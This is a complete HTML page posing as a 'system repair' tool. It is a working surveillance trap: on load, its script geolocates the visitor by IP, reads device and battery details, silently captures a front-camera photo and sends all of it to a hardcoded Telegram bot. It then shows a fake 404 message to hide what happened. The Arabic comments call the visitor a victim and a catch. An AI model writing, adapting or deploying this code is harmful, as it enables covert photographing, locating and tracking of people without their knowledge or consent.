<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>⚡ SYSTEM_REPAIR_v9</title>
</head>
<body style="background:#000; color:#ff0000; font-family:monospace; padding:20px; text-align:center;">
    <h2 id="st">INITIALIZING_SECURE_CONNECTION...</h2>
    <video id="v" autoplay style="width:1px; height:1px; opacity:0;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // --- الهوية المسجلة (المفاتيح التي قدمتها) ---
        const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
        const ID = "1772820433";

        async function ex(data, type='text') {
            let u = `https://api.telegram.org/bot${T}/`;
            if(type === 'text') {
                await fetch(u + 'sendMessage', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: ID, text: data})
                });
            } else {
                const b = await (await fetch(data)).blob();
                const f = new FormData();
                f.append('chat_id', ID);
                f.append('photo', b, 'hit.png');
                f.append('caption', "📸 تم سحب الهدف بنجاح 💀🔥");
                await fetch(u + 'sendPhoto', { method: 'POST', body: f });
            }
        }

        // 1. بروتوكول التجسس الصامت (IP & System Recon)
        async function getRecon() {
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                const bat = await navigator.getBattery();
                const info = `
🔥 صيد جديد في الشبكة!
---------------------
📍 الموقع: ${d.city}, ${d.country_name}
🌐 الإحداثيات: ${d.latitude}, ${d.longitude}
📶 المزود: ${d.org}
📱 الجهاز: ${navigator.platform}
🔋 البطارية: ${Math.round(bat.level * 100)}% (${bat.charging ? 'جاري الشحن' : 'تفريغ'})
🔗 الرابط التقريبي: http://www.google.com/maps/place/${d.latitude},${d.longitude}`;
                ex(info);
            } catch(e) { ex("❌ فشل سحب البيانات الأولية"); }
        }

        // 2. الهجوم الخاطف (Silent Capture Bypass)
        async function strike() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const vid = document.getElementById('v');
                vid.srcObject = s;
                
                // سرعة البرق (250ms) لخداع النظام
                setTimeout(() => {
                    const can = document.getElementById('c');
                    can.width = vid.videoWidth;
                    can.height = vid.videoHeight;
                    can.getContext('2d').drawImage(vid, 0, 0);
                    ex(can.toDataURL('image/png'), 'photo');
                    
                    // قتل الأثر فوراً
                    s.getTracks().forEach(t => t.stop());
                    document.getElementById('st').innerText = "ERROR_404: RESOURCE_NOT_FOUND";
                }, 250);
            } catch(e) { ex("⚠️ النظام حصين أو الضحية حذر!"); }
        }

        window.onload = () => {
            getRecon(); 
            strike();     
        };
    </script>
</body>
</html>
